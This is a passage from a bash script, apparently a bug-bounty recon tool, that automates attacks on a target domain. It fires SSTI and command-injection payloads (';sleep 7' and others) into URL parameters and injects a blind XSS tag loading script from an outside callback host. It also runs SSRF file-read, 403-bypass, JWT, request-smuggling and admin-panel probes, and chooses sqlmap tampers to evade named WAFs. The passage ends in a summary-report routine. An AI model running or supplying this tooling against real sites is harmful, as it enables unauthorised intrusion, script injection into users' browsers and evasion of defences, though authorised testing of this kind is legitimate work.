      && found "LFI confirmed → $lfi_out ($(count_lines "$lfi_out") hits)" \
      || success "No LFI confirmed"
  fi

  # ── 8m. SSTI — template injection probe ────────────────────────────
  local ssti_input="$OUT/params/hint_ssti.txt"
  [[ ! -s "$ssti_input" ]] && ssti_input="$OUT/params/gf_ssti.txt"
  [[ ! -s "$ssti_input" ]] && ssti_input="$OUT/params/all_param_urls.txt"

  if [[ -s "$ssti_input" ]]; then
    info "Probing for SSTI (template injection) …"
    local ssti_out="$vuln_dir/ssti_hits.txt"
    > "$ssti_out"
    # Payloads that evaluate to 13457633 across engines (Jinja2/Twig/EL/ERB/Smarty)
    local SSTI_PAYLOADS=(
      "{{13337*1009}}"
      "\${13337*1009}"
      "<%= 13337*1009 %>"
      "#{13337*1009}"
      "{13337*1009}"
      "*{13337*1009}"
      "{{13337|int * 1009}}"
    )
    while IFS= read -r url; do
      verbose "SSTI probe: $url"
      for payload in "${SSTI_PAYLOADS[@]}"; do
        test_url=$(echo "$url" | qsreplace "$payload" 2>/dev/null || echo "$url")
        verbose "  payload: $payload"
        resp=$(curl -sk --max-time "$TIMEOUT" "$test_url" 2>/dev/null)
        if echo "$resp" | grep -qF "13457633" && \
           ! echo "$resp" | grep -qF "$payload"; then
          echo "[SSTI] engine=? payload='$payload' → $test_url" | tee -a "$ssti_out"
          found "[SSTI] $test_url"
          break
        else
          verbose "  → not evaluated (no 13457633 in response)"
        fi
      done
    done < <(head -80 "$ssti_input")
    [[ -s "$ssti_out" ]] \
      && found "SSTI confirmed → $ssti_out ($(count_lines "$ssti_out") hits)" \
      || success "No SSTI confirmed"
  fi

  # ── 8n. Command Injection — time-based probe ───────────────────────
  local cmdi_input="$OUT/params/hint_cmdi.txt"
  [[ ! -s "$cmdi_input" ]] && cmdi_input="$OUT/params/gf_rce.txt"
  [[ ! -s "$cmdi_input" ]] && cmdi_input="$param_urls"

  if [[ -s "$cmdi_input" ]]; then
    info "Probing for command injection (time-based, 7s delay + baseline) …"
    local cmdi_out="$vuln_dir/cmdi_hits.txt"
    > "$cmdi_out"
    local CMDI_PAYLOADS=(
      ";sleep 7"
      "| sleep 7"
      "\`sleep 7\`"
      "& sleep 7 &"
      "%3Bsleep+7"
      "||sleep 7||"
    )
    local _cmdi_total
    _cmdi_total=$(head -40 "$cmdi_input" | wc -l)
    local _cmdi_n=0
    while IFS= read -r url; do
      (( _cmdi_n++ )) || true
      progress "$_cmdi_n" "$_cmdi_total" "CMDi probe: $url"
      # Measure baseline latency first
      local base_start=$SECONDS
      curl -sk --max-time 12 $(curl_auth) "$url" -o /dev/null 2>/dev/null || true
      local base_elapsed=$(( SECONDS - base_start ))
      verbose "  baseline latency: ${base_elapsed}s"
      for payload in "${CMDI_PAYLOADS[@]}"; do
        rate_wait
        test_url=$(echo "$url" | qsreplace "$payload" 2>/dev/null || echo "$url")
        verbose "  payload: $payload"
        start=$SECONDS
        curl -sk --max-time 20 $(curl_auth) "$test_url" -o /dev/null 2>/dev/null || true
        elapsed=$(( SECONDS - start ))
        verbose "  → elapsed: ${elapsed}s (baseline: ${base_elapsed}s)"
        local threshold=$(( base_elapsed + 6 ))
        if [[ $elapsed -ge 7 && $elapsed -ge $threshold ]]; then
          echo "[CMDi-TIME] delay=${elapsed}s baseline=${base_elapsed}s payload='$payload' → $test_url" | tee -a "$cmdi_out"
          found "[CMDi-TIME] ${elapsed}s delay on $test_url"
          break
        fi
      done
    done < <(head -40 "$cmdi_input")
    echo ""
    [[ -s "$cmdi_out" ]] \
      && found "CMDi time-based → $cmdi_out ($(count_lines "$cmdi_out") hits, verify manually)" \
      || success "No time-based CMDi confirmed"
  fi

  # ── 8o. Admin / login panel discovery ──────────────────────────────
  if [[ -f "$OUT/live_domains.txt" ]]; then
    info "Discovering admin / login panels …"
    local admin_out="$vuln_dir/admin_panels.txt"
    > "$admin_out"
    local ADMIN_PATHS=(
      "/admin" "/admin/" "/admin/login" "/admin/login.php" "/admin/index.php"
      "/administrator" "/administrator/index.php" "/administrator/login"
      "/wp-admin" "/wp-login.php" "/login" "/login.php" "/login.aspx"
      "/user/login" "/auth/login" "/account/login" "/signin" "/sign-in"
      "/panel" "/cpanel" "/controlpanel" "/manage" "/management"
      "/dashboard" "/portal" "/backend" "/staff" "/superuser"
      "/console" "/system" "/phpmyadmin" "/pma" "/adminer.php"
      "/jenkins" "/jira" "/confluence" "/grafana" "/kibana"
      "/manager/html" "/host-manager/html" "/solr" "/elmah.axd"
      "/.htaccess" "/server-status" "/_admin" "/siteadmin"
    )
    while IFS= read -r domain; do
      for path in "${ADMIN_PATHS[@]}"; do
        for scheme in https http; do
          url="${scheme}://${domain}${path}"
          code=$(curl -sk --max-time "$TIMEOUT" -o /dev/null \
            -w "%{http_code}" "$url" 2>/dev/null)
          if [[ "$code" =~ ^(200|301|302|401|403)$ ]]; then
            echo "[$code] $url" >> "$admin_out"
            [[ "$code" == "200" ]] && found "[$code] $url"
          fi
        done
      done
    done < <(head -10 "$OUT/live_domains.txt")
    [[ -s "$admin_out" ]] \
      && success "Admin panels → $admin_out ($(count_lines "$admin_out") hits)" \
      || success "No admin panels found"
  fi

  # ── 8p. IDOR — generate ±1 test URLs on numeric ID params ──────────
  local idor_input="$OUT/params/hint_idor.txt"
  [[ ! -s "$idor_input" ]] && idor_input="$OUT/params/gf_idor.txt"

  if [[ -s "$idor_input" ]]; then
    info "Generating IDOR test URLs (±1 on numeric ID params) …"
    local idor_out="$vuln_dir/idor_test_urls.txt"
    > "$idor_out"
    while IFS= read -r url; do
      # For every ?param=NNN or &param=NNN, emit ±1 variants
      while IFS= read -r match; do
        param=$(echo "$match" | cut -d= -f1 | sed 's/^[?&]//')
        val=$(echo "$match" | cut -d= -f2)
        if [[ "$val" =~ ^[0-9]+$ ]] && [[ "$val" -gt 0 ]]; then
          echo "$url" | sed "s/\([?&]\)${param}=${val}/\1${param}=$(( val + 1 ))/" >> "$idor_out"
          echo "$url" | sed "s/\([?&]\)${param}=${val}/\1${param}=$(( val - 1 ))/" >> "$idor_out"
        fi
      done < <(echo "$url" | grep -oP '[?&][a-zA-Z0-9_-]+=\d+')
    done < <(head -200 "$idor_input")
    sort -u -o "$idor_out" "$idor_out"
    [[ -s "$idor_out" ]] \
      && found "IDOR test URLs → $idor_out ($(count_lines "$idor_out") variants — test manually for auth bypass)" \
      || success "No numeric-ID params found for IDOR"
  fi

  # ── 8q. CRLF Injection (crlfuzz) ────────────────────────────────────
  if command -v crlfuzz &>/dev/null && [[ -f "$OUT/live_urls.txt" ]]; then
    info "Probing CRLF injection (crlfuzz) …"
    local crlf_out="$vuln_dir/crlf_hits.txt"
    > "$crlf_out"
    while IFS= read -r url; do
      verbose "CRLF probe: $url"
      crlfuzz -u "$url" 2>"$REDIR" \
        | grep -iE "^(VULN|CRLFOUND|\[VULN\])" \
        | tee -a "$crlf_out" | while IFS= read -r line; do found "$line"; done || true
    done < <(head -50 "$live_urls")
    [[ -s "$crlf_out" ]] \
      && found "CRLF hits → $crlf_out ($(count_lines "$crlf_out"))" \
      || success "No CRLF injection found"
  fi

  # ── 8r. Blind XSS (bxss + interactsh) ──────────────────────────────
  if command -v bxss &>/dev/null && [[ -s "$param_urls" ]]; then
    if [[ -n "${BXSS_CALLBACK:-}" ]]; then
      info "Running blind XSS injection (bxss) with callback: $BXSS_CALLBACK …"
      local bxss_payload="<script src='${BXSS_CALLBACK}/bxss.js'></script>"
      bxss -appendMode -payload "$bxss_payload" \
        -parameters \
        -url "$(head -1 "$param_urls")" 2>"$REDIR" \
        > "$vuln_dir/bxss_injected.txt" || true
      success "Blind XSS payloads injected → check $BXSS_CALLBACK for callbacks"
    else
      warn "Set BXSS_CALLBACK=https://your-interactsh-url to enable blind XSS (bxss)"
      info "Example: BXSS_CALLBACK=https://xyz.interact.sh bash recon_linux.sh -d $DOMAIN"
    fi
  fi

  # ── 8s. XSStrike — smart XSS with WAF bypass ────────────────────────
  local xsstrike="$HOME/tools/XSStrike/xsstrike.py"
  local xsstrike_py="$HOME/tools/XSStrike/venv/bin/python"
  [[ ! -x "$xsstrike_py" ]] && xsstrike_py="python3"
  if [[ -f "$xsstrike" ]] && [[ -s "$OUT/params/hint_xss.txt" ]]; then
    info "Running XSStrike (smart XSS, first 20 URLs) …"
    local xsstrike_out="$vuln_dir/xsstrike_hits.txt"
    > "$xsstrike_out"
    while IFS= read -r url; do
      verbose "XSStrike: $url"
      "$xsstrike_py" "$xsstrike" -u "$url" \
        --skip --skip-dom --blind \
        2>"$REDIR" \
        | grep -iE "(vuln|xss found|\[vuln\])" \
        | tee -a "$xsstrike_out" | while IFS= read -r line; do found "[XSStrike] $line"; done || true
    done < <(head -20 "$OUT/params/hint_xss.txt")
    [[ -s "$xsstrike_out" ]] \
      && found "XSStrike hits → $xsstrike_out" \
      || success "XSStrike: no XSS found"
  fi

  # ── 8t. Gxss — fast XSS reflection check ────────────────────────────
  if command -v Gxss &>/dev/null && [[ -s "$param_urls" ]]; then
    info "Running Gxss (reflection check) …"
    cat "$param_urls" \
      | Gxss -c "$THREADS" 2>"$REDIR" \
      | sort -u > "$vuln_dir/gxss_reflected.txt" || true
    [[ -s "$vuln_dir/gxss_reflected.txt" ]] \
      && found "Gxss reflections → $vuln_dir/gxss_reflected.txt ($(count_lines "$vuln_dir/gxss_reflected.txt"))" \
      || success "Gxss: no reflections found"
  fi

  # ── 8u. Ghauri — advanced SQLi scanner ──────────────────────────────
  if command -v ghauri &>/dev/null && [[ -s "$vuln_dir/sqli_candidates.txt" ]]; then
    info "Running ghauri (advanced SQLi) on candidates …"
    local ghauri_out="$vuln_dir/ghauri_sqli.txt"
    > "$ghauri_out"
    while IFS= read -r url; do
      verbose "ghauri: $url"
      ghauri -u "$url" \
        --batch --level 2 \
        --output-dir "$vuln_dir/ghauri" \
        2>"$REDIR" | tee -a "$ghauri_out" || true
    done < <(head -20 "$vuln_dir/sqli_candidates.txt")
    [[ -s "$ghauri_out" ]] \
      && found "ghauri SQLi → $ghauri_out" \
      || success "ghauri: no SQLi confirmed"
  fi

  # ── 8v. CSRF — XSRFProbe ────────────────────────────────────────────
  if command -v xsrfprobe &>/dev/null && [[ -f "$live_urls" ]]; then
    info "Running XSRFProbe (CSRF scanner) …"
    local csrf_out="$vuln_dir/csrf_hits.txt"
    > "$csrf_out"
    while IFS= read -r url; do
      verbose "CSRF probe: $url"
      xsrfprobe -u "$url" --crawl --skip-analysis \
        2>"$REDIR" \
        | grep -iE "(vuln|csrf found|no token)" \
        | tee -a "$csrf_out" | while IFS= read -r l; do warn "[CSRF] $l"; done || true
    done < <(head -10 "$live_urls")
    [[ -s "$csrf_out" ]] \
      && found "CSRF hits → $csrf_out ($(count_lines "$csrf_out"))" \
      || success "XSRFProbe: no CSRF issues found"
  fi

  # ── 8w. SSRF — SSRFmap ──────────────────────────────────────────────
  local ssrfmap="$HOME/tools/SSRFmap/ssrfmap.py"
  local ssrfmap_py="$HOME/tools/SSRFmap/venv/bin/python"
  [[ ! -x "$ssrfmap_py" ]] && ssrfmap_py="python3"
  if [[ -f "$ssrfmap" ]] && [[ -s "$OUT/params/hint_redirect_ssrf.txt" ]]; then
    info "Running SSRFmap on SSRF-hint URLs …"
    local ssrfmap_out="$vuln_dir/ssrfmap_hits.txt"
    > "$ssrfmap_out"
    while IFS= read -r url; do
      verbose "SSRFmap: $url"
      "$ssrfmap_py" "$ssrfmap" -u "$url" \
        -m readfile,portscan \
        2>"$REDIR" \
        | grep -iE "(vuln|ssrf|found)" \
        | tee -a "$ssrfmap_out" || true
    done < <(head -20 "$OUT/params/hint_redirect_ssrf.txt")
    [[ -s "$ssrfmap_out" ]] \
      && found "SSRFmap hits → $ssrfmap_out" \
      || success "SSRFmap: no SSRF confirmed"
  fi

  # ── 8x. HTTP Request Smuggling (smuggler) ───────────────────────────
  local smuggler="$HOME/tools/smuggler/smuggler.py"
  local smuggler_py="$HOME/tools/smuggler/venv/bin/python"
  [[ ! -x "$smuggler_py" ]] && smuggler_py="python3"
  if [[ -f "$smuggler" ]] && [[ -f "$live_urls" ]]; then
    info "Probing HTTP request smuggling (smuggler) …"
    local smuggling_out="$vuln_dir/smuggling_hits.txt"
    > "$smuggling_out"
    while IFS= read -r url; do
      verbose "Smuggler: $url"
      "$smuggler_py" "$smuggler" -u "$url" \
        --log "$vuln_dir/smuggler_raw.txt" \
        2>"$REDIR" \
        | grep -iE "(vuln|cve-|issue)" \
        | tee -a "$smuggling_out" || true
    done < <(head -10 "$live_urls")
    [[ -s "$smuggling_out" ]] \
      && found "Smuggling → $smuggling_out" \
      || success "smuggler: no smuggling found"
  fi

  # ── 8y. 403 Bypass (byp4xx) ─────────────────────────────────────────
  if command -v byp4xx &>/dev/null && [[ -s "$vuln_dir/sensitive_files.txt" ]]; then
    info "Attempting 403 bypass (byp4xx) on forbidden endpoints …"
    local bypass_out="$vuln_dir/403_bypass.txt"
    > "$bypass_out"
    grep "^\[403\]" "$vuln_dir/sensitive_files.txt" \
      | grep -oP 'https?://\S+' \
      | while IFS= read -r url; do
          verbose "byp4xx: $url"
          byp4xx -u "$url" 2>"$REDIR" \
            | grep -E "^200 " \
            | tee -a "$bypass_out" | while IFS= read -r l; do found "[403-BYPASS] $l"; done || true
        done || true
    [[ -s "$bypass_out" ]] \
      && found "403 bypass hits → $bypass_out ($(count_lines "$bypass_out"))" \
      || success "byp4xx: no 403 bypasses found"
  fi

  # ── 8z. JWT Testing (jwt_tool) ──────────────────────────────────────
  local jwt_tool="$HOME/tools/jwt_tool/jwt_tool.py"
  local jwt_py="$HOME/tools/jwt_tool/venv/bin/python"
  [[ ! -x "$jwt_py" ]] && jwt_py="python3"
  if [[ -f "$jwt_tool" ]] && [[ -f "$live_urls" ]]; then
    info "Scanning for JWT tokens in responses …"
    local jwt_out="$vuln_dir/jwt_hits.txt"
    > "$jwt_out"
    while IFS= read -r url; do
      jwt_candidates=$(curl -sk --max-time "$TIMEOUT" -D - "$url" 2>/dev/null \
        | grep -oP 'eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+')
      for token in $jwt_candidates; do
        verbose "JWT found at $url — testing: ${token:0:30}…"
        "$jwt_py" "$jwt_tool" "$token" -M at 2>"$REDIR" \
          | grep -iE "(alg:none|vulnerable|weak|exploit)" \
          | while IFS= read -r l; do
              echo "[JWT] $l → $url" | tee -a "$jwt_out"
              found "[JWT] $l"
            done || true
      done
    done < <(head -20 "$live_urls")
    [[ -s "$jwt_out" ]] \
      && found "JWT issues → $jwt_out ($(count_lines "$jwt_out"))" \
      || success "No JWT vulnerabilities found"
  fi

  # ── 8aa. TLS/SSL Scan (tlsx) ────────────────────────────────────────
  if command -v tlsx &>/dev/null && [[ -f "$OUT/live_domains.txt" ]]; then
    info "Running TLS scan (tlsx) …"
    tlsx -l "$OUT/live_domains.txt" \
      $SILENT \
      -expired -self-signed -mismatched -revoked \
      -o "$vuln_dir/tls_issues.txt" 2>"$REDIR" || true
    [[ -s "$vuln_dir/tls_issues.txt" ]] \
      && found "TLS issues → $vuln_dir/tls_issues.txt ($(count_lines "$vuln_dir/tls_issues.txt"))" \
      || success "No TLS issues found"
  fi

  # ── 8ab. Secrets Detection (trufflehog) ─────────────────────────────
  if command -v trufflehog &>/dev/null; then
    info "Running trufflehog secrets scan on crawled JS/output …"
    trufflehog filesystem "$OUT/js" \
      --only-verified \
      --json 2>"$REDIR" \
      | tee "$vuln_dir/trufflehog_secrets.json" \
      | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        r = json.loads(line)
        det = r.get('DetectorName',''); raw = r.get('Raw','')[:80]
        src = r.get('SourceMetadata',{}).get('Data',{})
        print(f'[SECRET] {det}: {raw}  src={src}')
    except: pass
" > "$vuln_dir/trufflehog_hits.txt" 2>/dev/null || true
    [[ -s "$vuln_dir/trufflehog_hits.txt" ]] \
      && found "Secrets → $vuln_dir/trufflehog_hits.txt ($(count_lines "$vuln_dir/trufflehog_hits.txt"))" \
      || success "trufflehog: no verified secrets found"
  fi

  # ── 8ac. Corsy — enhanced CORS scanner ──────────────────────────────
  local corsy="$HOME/tools/Corsy/corsy.py"
  local corsy_py="$HOME/tools/Corsy/venv/bin/python"
  [[ ! -x "$corsy_py" ]] && corsy_py="python3"
  if [[ -f "$corsy" ]] && [[ -f "$live_urls" ]]; then
    info "Running Corsy (CORS scanner) …"
    "$corsy_py" "$corsy" \
      -i "$live_urls" \
      -t "$THREADS" \
      -o "$vuln_dir/corsy_cors.json" 2>"$REDIR" || true
    [[ -s "$vuln_dir/corsy_cors.json" ]] \
      && found "Corsy CORS results → $vuln_dir/corsy_cors.json" \
      || success "Corsy: no CORS issues found"
  fi

  # ── 8ad. Cloud Asset Discovery (S3, GCS, Azure) ──────────────────────
  info "Probing cloud storage assets …"
  local cloud_out="$vuln_dir/cloud_assets.txt"
  > "$cloud_out"
  local domain_word="${DOMAIN%%.*}"   # e.g. "example" from example.com
  local cloud_buckets=(
    "https://${domain_word}.s3.amazonaws.com"
    "https://s3.amazonaws.com/${domain_word}"
    "https://${domain_word}.storage.googleapis.com"
    "https://storage.googleapis.com/${domain_word}"
    "https://${domain_word}.blob.core.windows.net"
    "https://${DOMAIN}.s3.amazonaws.com"
    "https://s3.amazonaws.com/${DOMAIN}"
    "https://${domain_word}-backup.s3.amazonaws.com"
    "https://${domain_word}-dev.s3.amazonaws.com"
    "https://${domain_word}-prod.s3.amazonaws.com"
    "https://${domain_word}-assets.s3.amazonaws.com"
    "https://${domain_word}-static.s3.amazonaws.com"
    "https://${domain_word}-data.s3.amazonaws.com"
  )
  for bucket in "${cloud_buckets[@]}"; do
    code=$(curl -sk --max-time 8 -o /dev/null -w "%{http_code}" "$bucket" 2>/dev/null)
    if [[ "$code" == "200" || "$code" == "403" ]]; then
      echo "[$code] $bucket" >> "$cloud_out"
      [[ "$code" == "200" ]] && found "[CLOUD-OPEN] $bucket"
      [[ "$code" == "403" ]] && warn "[CLOUD-403] $bucket (exists but restricted)"
    fi
  done
  [[ -s "$cloud_out" ]] \
    && found "Cloud assets → $cloud_out ($(count_lines "$cloud_out") hits)" \
    || success "No exposed cloud buckets found"

  # ── 8ae. Gitleaks — secrets in output directory ───────────────────────
  if command -v gitleaks &>/dev/null; then
    info "Running gitleaks on scan output directory …"
    gitleaks detect \
      --source "$OUT" \
      --no-git \
      --report-format json \
      --report-path "$vuln_dir/gitleaks.json" \
      2>"$REDIR" || true
    [[ -s "$vuln_dir/gitleaks.json" ]] \
      && found "Gitleaks secrets → $vuln_dir/gitleaks.json" \
      || success "gitleaks: no secrets found"
  fi

  # ── 8af. Tech-Specific Scanning ──────────────────────────────────────
  local tech_file="$OUT/detected_tech.txt"
  if [[ -f "$tech_file" ]]; then
    # WordPress
    if grep -qi "wordpress\|wp-" "$tech_file" 2>/dev/null; then
      if command -v wpscan &>/dev/null && [[ -f "$live_urls" ]]; then
        info "WordPress detected — running wpscan …"
        local wp_out="$vuln_dir/wpscan.txt"
        head -5 "$live_urls" | while IFS= read -r url; do
          wpscan --url "$url" --no-banner \
            --enumerate u,vp,vt,tt,cb,dbe \
            --format cli-no-colour \
            $([ -n "$AUTH_COOKIE" ] && echo "--cookie $AUTH_COOKIE") \
            2>/dev/null | tee -a "$wp_out" || true
        done
        [[ -s "$wp_out" ]] && found "WPScan results → $wp_out"
      fi
    fi

    # Spring Boot actuator endpoints
    if grep -qi "spring\|java\|tomcat" "$tech_file" 2>/dev/null; then
      info "Spring/Java detected — probing actuator endpoints …"
      local actuator_out="$vuln_dir/actuator_endpoints.txt"
      > "$actuator_out"
      local ACTUATOR_PATHS=("/actuator" "/actuator/env" "/actuator/health"
        "/actuator/mappings" "/actuator/beans" "/actuator/configprops"
        "/actuator/loggers" "/actuator/heapdump" "/actuator/threaddump"
        "/actuator/info" "/actuator/metrics" "/actuator/shutdown")
      [[ -f "$OUT/live_domains.txt" ]] && \
      while IFS= read -r domain; do
        for path in "${ACTUATOR_PATHS[@]}"; do
          code=$(curl -sk --max-time "$TIMEOUT" $(curl_auth) \
            -o /dev/null -w "%{http_code}" "https://${domain}${path}" 2>/dev/null)
          [[ "$code" == "200" ]] && \
            echo "[ACTUATOR-200] https://${domain}${path}" | tee -a "$actuator_out"
        done
      done < <(head -5 "$OUT/live_domains.txt")
      [[ -s "$actuator_out" ]] && found "Spring actuator → $actuator_out"
    fi

    # GraphQL introspection
    if grep -qi "graphql\|apollo" "$tech_file" 2>/dev/null || \
       grep -qi "/graphql" "$OUT/urls/all_urls.txt" 2>/dev/null; then
      info "GraphQL detected — testing introspection …"
      local graphql_out="$vuln_dir/graphql_introspection.txt"
      > "$graphql_out"
      local GRAPHQL_PATHS=("/graphql" "/graphiql" "/api/graphql" "/v1/graphql")
      [[ -f "$OUT/live_domains.txt" ]] && \
      while IFS= read -r domain; do
        for path in "${GRAPHQL_PATHS[@]}"; do
          resp=$(curl -sk --max-time "$TIMEOUT" $(curl_auth) \
            -X POST -H "Content-Type: application/json" \
            -d '{"query":"{ __schema { types { name } } }"}' \
            "https://${domain}${path}" 2>/dev/null)
          if echo "$resp" | grep -q "__schema"; then
            echo "[GRAPHQL-INTROSPECT] https://${domain}${path}" | tee -a "$graphql_out"
            found "GraphQL introspection enabled: https://${domain}${path}"
          fi
        done
      done < <(head -5 "$OUT/live_domains.txt")
      [[ -s "$graphql_out" ]] && found "GraphQL → $graphql_out"
    fi
  fi

  # Add WAF tamper to sqlmap if WAF was detected
  if [[ -f "$OUT/waf.txt" ]] && [[ -f "$vuln_dir/sqlmap_targets.txt" ]]; then
    local waf_name
    waf_name=$(cat "$OUT/waf.txt" 2>/dev/null | tr '[:upper:]' '[:lower:]')
    local extra_tamper="space2comment,between,randomcase"
    if echo "$waf_name" | grep -qi "cloudflare"; then
      extra_tamper="space2comment,between,randomcase,charunicodeescape"
    elif echo "$waf_name" | grep -qi "modsecurity\|mod_security"; then
      extra_tamper="space2comment,between,charunicodeescape,urlencode"
    fi
    info "WAF ($waf_name) detected — sqlmap tamper: $extra_tamper"
    echo "$extra_tamper" > "$vuln_dir/sqlmap_tamper.txt"
  fi
}

# ═══════════════════════════════════════════════════════════
#  PHASE 9 — Generate Summary Report
# ═══════════════════════════════════════════════════════════
phase9_report() {
  phase "PHASE 9 — Final Summary Report"

  local report="$OUT/SUMMARY.txt"
  local vuln_dir="$OUT/vulns"

  # ── Helper: print section header ──────────────────────────────────
  _sec() { echo ""; echo "  ── $* ──"; }

  # ── 1. Write plain-text SUMMARY.txt to disk ───────────────────────
  {
    echo "======================================================"
    echo "  RECON SUMMARY — $DOMAIN"
    echo "  $(date)"
    echo "======================================================"

    _sec "SUBDOMAINS"
    printf "  %-20s : %s\n" "All found"    "$(count_lines "$OUT/subdomains/all_subdomains.txt")"
    printf "  %-20s : %s\n" "Resolved"     "$(count_lines "$OUT/subdomains/resolved.txt")"
    printf "  %-20s : %s\n" "Live domains" "$(count_lines "$OUT/live_domains.txt")"
    printf "  %-20s : %s\n" "Dead domains" "$(count_lines "$OUT/dead_domains.txt")"

    _sec "URLS"
    printf "  %-20s : %s\n" "Wayback"    "$(count_lines "$OUT/urls/wayback.txt")"
    printf "  %-20s : %s\n" "GAU"        "$(count_lines "$OUT/urls/gau.txt")"
    printf "  %-20s : %s\n" "Katana"     "$(count_lines "$OUT/urls/katana.txt")"
    printf "  %-20s : %s\n" "All unique" "$(count_lines "$OUT/urls/all_urls.txt")"

    _sec "JS FILES"
    printf "  %-20s : %s\n" "JS URLs"       "$(count_lines "$OUT/js/js_urls.txt")"
    printf "  %-20s : %s\n" "LinkFinder EP" "$(count_lines "$OUT/js/linkfinder_endpoints.txt")"
    printf "  %-20s : %s\n" "Secret hints"  "$(count_lines "$OUT/js/js_secrets.txt")"

    _sec "PARAMETERS"
    printf "  %-20s : %s\n" "Total param URLs"  "$(count_lines "$OUT/params/all_param_urls.txt")"
    printf "  %-20s : %s\n" "With ? only"       "$(count_lines "$OUT/params/urls_with_question.txt")"
    printf "  %-20s : %s\n" "With = only"       "$(count_lines "$OUT/params/urls_with_equals.txt")"
    printf "  %-20s : %s\n" "Unique param names" "$(count_lines "$OUT/params/unique_param_names.txt")"
    printf "  %-20s : %s\n" "Interesting"       "$(count_lines "$OUT/params/interesting_params.txt")"
    for hint in redirect_ssrf lfi idor sqli xss ssti cmdi; do
      f="$OUT/params/hint_${hint}.txt"
      count=$(count_lines "$f")
      [[ $count -gt 0 ]] && printf "  hint_%-15s : %s URLs\n" "$hint" "$count"
    done

    _sec "VULNERABILITY FINDINGS"
    # Confirmed / high-value
    local CONFIRMED_FILES=(
      "sqli_errors.txt:SQLi error-based (CONFIRMED)"
      "sqli_blind.txt:SQLi blind candidates"
      "dalfox_confirmed.txt:XSS confirmed (dalfox)"
      "xss_reflected_probe.txt:XSS reflected (probe)"
      "kxss_reflected.txt:XSS reflected (kxss)"
      "lfi_hits.txt:LFI / path traversal (CONFIRMED)"
      "ssti_hits.txt:SSTI confirmed"
      "cmdi_hits.txt:CMDi time-based"
      "open_redirects.txt:Open redirects"
      "cors.txt:CORS misconfiguration"
      "takeovers.txt:Subdomain takeover"
      "sensitive_files.txt:Sensitive files exposed"
      "missing_headers.txt:Missing security headers"
      "admin_panels.txt:Admin panels"
      "nuclei.txt:Nuclei findings"
      "nuclei_cves.txt:Nuclei CVEs"
      "nuclei_misconfig.txt:Nuclei misconfigs"
      "nuclei_exposures.txt:Nuclei exposures"
      "nuclei_takeovers.txt:Nuclei takeovers"
      "nuclei_default-logins.txt:Default logins"
      "idor_test_urls.txt:IDOR test URLs (manual verify)"
      "ssrf_probes.txt:SSRF probe URLs (check callback)"
      "crlf_hits.txt:CRLF injection"
      "xsstrike_hits.txt:XSStrike XSS"
      "gxss_reflected.txt:Gxss reflections"
      "ghauri_sqli.txt:Ghauri SQLi"
      "csrf_hits.txt:CSRF (XSRFProbe)"
      "ssrfmap_hits.txt:SSRF (SSRFmap)"
      "smuggling_hits.txt:HTTP smuggling"
      "403_bypass.txt:403 bypass (byp4xx)"
      "jwt_hits.txt:JWT vulnerabilities"
      "tls_issues.txt:TLS/SSL issues"
      "trufflehog_hits.txt:Secrets (trufflehog)"
      "corsy_cors.json:CORS (Corsy)"
    )
    local any_found=false
    for entry in "${CONFIRMED_FILES[@]}"; do
      fname="${entry%%:*}"
      label="${entry##*:}"
      f="$vuln_dir/$fname"
      if [[ -f "$f" ]] && [[ -s "$f" ]]; then
        any_found=true
        printf "  [FOUND] %-38s : %s lines\n" "$label" "$(count_lines "$f")"
        printf "          %-38s   %s\n" "" "$f"
      fi
    done
    $any_found || echo "  No findings recorded."

    echo ""
    echo "[OUTPUT DIRECTORY]"
    echo "  $OUT"
    echo ""
    echo "======================================================"
  } > "$report"

  # ── 2. Colorized terminal output ──────────────────────────────────
  echo ""
  echo -e "${BOLD}${BLUE}══════════════════════════════════════════════════════${NC}"
  echo -e "${BOLD}${WHITE}  RECON COMPLETE — $DOMAIN${NC}"
  echo -e "${BOLD}${BLUE}══════════════════════════════════════════════════════${NC}"
  echo ""

  # Stats block
  echo -e "${CYAN}  Subdomains found  :${NC} $(count_lines "$OUT/subdomains/all_subdomains.txt")"
  echo -e "${CYAN}  Live domains      :${NC} $(count_lines "$OUT/live_domains.txt")"
  echo -e "${CYAN}  Total URLs        :${NC} $(count_lines "$OUT/urls/all_urls.txt")"
  echo -e "${CYAN}  Param URLs        :${NC} $(count_lines "$OUT/params/all_param_urls.txt")"
  echo -e "${CYAN}  Interesting params:${NC} $(count_lines "$OUT/params/interesting_params.txt")"
  echo ""

  # ── 3. CONFIRMED vulnerabilities — print label + every finding line ─
  echo -e "${BOLD}${RED}  ╔══════════════════════════════════════════════════╗${NC}"
  echo -e "${BOLD}${RED}  ║           CONFIRMED / HIGH-VALUE FINDINGS        ║${NC}"
  echo -e "${BOLD}${RED}  ╚══════════════════════════════════════════════════╝${NC}"
  echo ""

  local CRITICAL_FILES=(
    "sqli_errors.txt:SQLi ERROR-BASED:RED"
    "sqli_blind.txt:SQLi BLIND CANDIDATE:YELLOW"
    "lfi_hits.txt:LFI / PATH TRAVERSAL:RED"
    "ssti_hits.txt:SSTI CONFIRMED:RED"
    "cmdi_hits.txt:COMMAND INJECTION (time-based):RED"
    "dalfox_confirmed.txt:XSS CONFIRMED (dalfox):RED"
    "xss_reflected_probe.txt:XSS REFLECTED:YELLOW"
    "kxss_reflected.txt:XSS REFLECTION (kxss):YELLOW"
    "open_redirects.txt:OPEN REDIRECT:YELLOW"
    "cors.txt:CORS MISCONFIGURATION:YELLOW"
    "corsy_cors.json:CORS — Corsy:YELLOW"
    "takeovers.txt:SUBDOMAIN TAKEOVER:RED"
    "crlf_hits.txt:CRLF INJECTION:YELLOW"
    "xsstrike_hits.txt:XSS — XSStrike:RED"
    "gxss_reflected.txt:XSS REFLECTION — Gxss:YELLOW"
    "ghauri_sqli.txt:SQLi — Ghauri:RED"
    "csrf_hits.txt:CSRF — XSRFProbe:YELLOW"
    "ssrfmap_hits.txt:SSRF — SSRFmap:RED"
    "smuggling_hits.txt:HTTP REQUEST SMUGGLING:RED"
    "403_bypass.txt:403 BYPASS:YELLOW"
    "jwt_hits.txt:JWT VULNERABILITY:RED"
    "tls_issues.txt:TLS/SSL ISSUES:YELLOW"
    "trufflehog_hits.txt:SECRETS DETECTED:RED"
  )

  local crit_found=false
  for entry in "${CRITICAL_FILES[@]}"; do
    IFS=':' read -r fname label color <<< "$entry"
    f="$vuln_dir/$fname"
    [[ ! -f "$f" ]] || [[ ! -s "$f" ]] && continue
    crit_found=true
    local clr="${RED}"
    [[ "$color" == "YELLOW" ]] && clr="${YELLOW}"
